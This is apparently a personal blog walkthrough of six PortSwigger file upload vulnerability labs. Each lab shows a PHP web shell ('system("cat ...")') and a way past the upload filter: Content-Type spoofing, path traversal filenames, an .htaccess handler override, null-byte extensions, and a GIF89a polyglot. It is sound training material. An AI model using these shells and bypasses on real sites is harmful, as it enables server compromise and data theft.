---
layout: post
title: PortSwigger - File upload vulnerabilities Labs
subtitle: Walkthroughs for Labs 1-6
description: PortSwigger Web Security Academy - File upload vulnerabilities labs
image: /assets/image/Portswigger/download.png
category: PortSwigger Labs
tags: [PortSwigger, FileUpload, WebSecurity, CTF]
author: mustafa_altayeb
date: 2026-02-20 00:00:00 +0000
paginate: true
---

# PortSwigger – File upload vulnerabilities Labs

Just finished the first six File upload vulnerabilities labs on PortSwigger. These are all about bypassing different types of upload restrictions to get a web shell and read the secret file. Here's how I solved each one.

## LAB 1: Remote code execution via web shell upload

**Analysis**  

1) This lab contains a vulnerable image upload function.  
2) To solve the lab read `/home/carlos/secret` file  
3) Credential to login: wiener:peter

**Steps to solve**  

1) Login to my account using credentials we have:  

![alt text](/assets/image/Portswigger/fileupload/image.png)

2) Create php file and put php code that execute shell that read file we need:  

```php
<?php system("cat /home/carlos/secret"); ?>
```

3) Upload the file to an input field:  

![alt text](/assets/image/Portswigger/fileupload/image-1.png)

4) Inspect the page to see where the file go:  

![alt text](/assets/image/Portswigger/fileupload/image-2.png)

5) Access file from link `/files/avatars/shell.php`:  

![alt text](/assets/image/Portswigger/fileupload/image-3.png)

6) Submit flag to submit solution in the lab:  

![alt text](/assets/image/Portswigger/fileupload/image-4.png)

Finished happy hacking!

## LAB 2: Web shell upload via Content-Type restriction bypass

**Analysis**  

1) This lab contains a vulnerable image upload function.  
2) To solve the lab read `/home/carlos/secret` file  
3) Credential to login: wiener:peter

**Steps to solve**  

1) Login to my account using credentials we have:  

![alt text](/assets/image/Portswigger/fileupload/image.png)

2) Create php file and put php code that execute shell that read file we need:  

```php
<?php system("cat /home/carlos/secret"); ?>
```

3) Upload the file to an input field:  

![alt text](/assets/image/Portswigger/fileupload/image-1.png)

4) When click upload appear an error which mean the application accept only images png or jpg:  

![alt text](/assets/image/Portswigger/fileupload/image-5.png)

5) Intercept request with burp and change content type to image/png:  

![alt text](/assets/image/Portswigger/fileupload/image-6.png)

6) Click send and open page source to see where our shell stored:  

![alt text](/assets/image/Portswigger/fileupload/image-7.png)

7) Click the link and got the flag:  

![alt text](/assets/image/Portswigger/fileupload/image-8.png)

8) Submit flag to submit solution in the lab:  

![alt text](/assets/image/Portswigger/fileupload/image-4.png)

Finished happy hacking!

## LAB 3: Web shell upload via path traversal

**Analysis**  

1) This lab contains a vulnerable image upload function.  
2) To solve the lab read `/home/carlos/secret` file  
3) Credential to login: wiener:peter

**Steps to solve**  

1) Login to my account using credentials we have:  

![alt text](/assets/image/Portswigger/fileupload/image.png)

2) Create php file and put php code that execute shell that read file we need:  

```php
<?php system("cat /home/carlos/secret"); ?>
```

3) Upload the file to an input field:  

![alt text](/assets/image/Portswigger/fileupload/image-1.png)

4) Trying to access our shell but execution prohibited in this directory:  
![alt text](/assets/image/Portswigger/fileupload/image-9.png)

5) In our request `POST /my-account/avatar` we can upload this file to other directory by back with `../`  

6) Change file name and make it `../shell.php` but encode `/` to `%2f` so file name will be `..%2fshell.php`:  

![alt text](/assets/image/Portswigger/fileupload/image-10.png)

7) Access the file using link to avatar that's in page source:  

![alt text](/assets/image/Portswigger/fileupload/image-11.png)

8) Make link `../shell.php` and access `/files/avatar/../shell.php` and got the flag:  
![alt text](/assets/image/Portswigger/fileupload/image-12.png)

Finished happy hacking!

## LAB 4: Web shell upload via extension blacklist bypass

**Analysis**  

1) This lab contains a vulnerable image upload function.  
2) To solve the lab read `/home/carlos/secret` file  
3) Credential to login: wiener:peter

**Steps to solve**  

1) Login to my account using credentials we have:  

![alt text](/assets/image/Portswigger/fileupload/image.png)

2) Create php file and put php code that execute shell that read file we need:  

```php
<?php system("cat /home/carlos/secret"); ?>
```

3) Upload the file to an input field:  

![alt text](/assets/image/Portswigger/fileupload/image-1.png)

4) I got an error from php filter:  

![alt text](/assets/image/Portswigger/fileupload/image-13.png)

5) Trying to upload the file with .php5 and success but i'm not able to execute the file so that i try to upload .htaccess file and it's uploaded:  
![alt text](/assets/image/Portswigger/fileupload/image-14.png)

Create `.htaccess` file:  
```php
AddType application/x-httpd-php .test
```

Upload it then upload shell as `shell.test`:

![alt text](/assets/image/Portswigger/fileupload/image-15.png)  
![alt text](/assets/image/Portswigger/fileupload/image-16.png)

8) Access the file from page source and got flag:  

![alt text](/assets/image/Portswigger/fileupload/image-17.png)

Finished happy hacking!

## LAB 5: Web shell upload via obfuscated file extension

**Analysis**  

1) This lab contains a vulnerable image upload function.  
2) To solve the lab read `/home/carlos/secret` file  
3) Credential to login: wiener:peter

**Steps to solve**  

1) Login to my account using credentials we have:  

![alt text](/assets/image/Portswigger/fileupload/image.png)

2) Create php file and put php code that execute shell that read file we need:  

```php
<?php system("cat /home/carlos/secret"); ?>
```

3) Upload the file to an input field:  

![alt text](/assets/image/Portswigger/fileupload/image-1.png)

4) I got an error from php filter this need jpg or png only:  

![alt text](/assets/image/Portswigger/fileupload/image-18.png)

5) So that i added null byte `%00` which make all after it meaningless our file will be `shell.php%00.jpg` and upload:  

![alt text](/assets/image/Portswigger/fileupload/image-19.png)

6) Access /assets/image/Portswigger/fileupload/image from right click and view image got an error because null byte, open url and delete null bytes:  
![alt text](/assets/image/Portswigger/fileupload/image-20.png)

7) Access link and got the flag:  

![alt text](/assets/image/Portswigger/fileupload/image-21.png)

Finished happy hacking!

## LAB 6: Remote code execution via polyglot web shell upload

**Analysis**  

1) This lab contains a vulnerable image upload function.  
2) To solve the lab read `/home/carlos/secret` file  
3) Credential to login: wiener:peter

**Steps to solve**  

1) Login to my account using credentials we have:  

![alt text](/assets/image/Portswigger/fileupload/image.png)

2) Create php file and put php code that execute shell that read file we need:  

```php
<?php system("cat /home/carlos/secret"); ?>
```

3) Upload the file to an input field:  

![alt text](/assets/image/Portswigger/fileupload/image-1.png)

4) I got an error say this is not an image:  
![alt text](/assets/image/Portswigger/fileupload/image-22.png)

5) It's use magic bytes. I added `GIF89a` at the beginning of the shell:  

```php
GIF89a<?php system("cat /home/carlos/secret"); ?>
```

6) Upload the shell and server accepted it. Open image link and got the flag:  

![alt text](/assets/image/Portswigger/fileupload/image-23.png)  
![alt text](/assets/image/Portswigger/fileupload/image-24.png)

Finished happy hacking!

---
**Find me online**:  
• TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)  
• HackTheBox: [t4t4r1s](https://app.hackthebox.com/users/2203575)  
• LinkedIn: [Mustafa Altayeb](https://www.linkedin.com/in/t4t4r1s)  
• X: [@mustafa_altayeb](https://x.com/t4t4r1s)

---
<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>
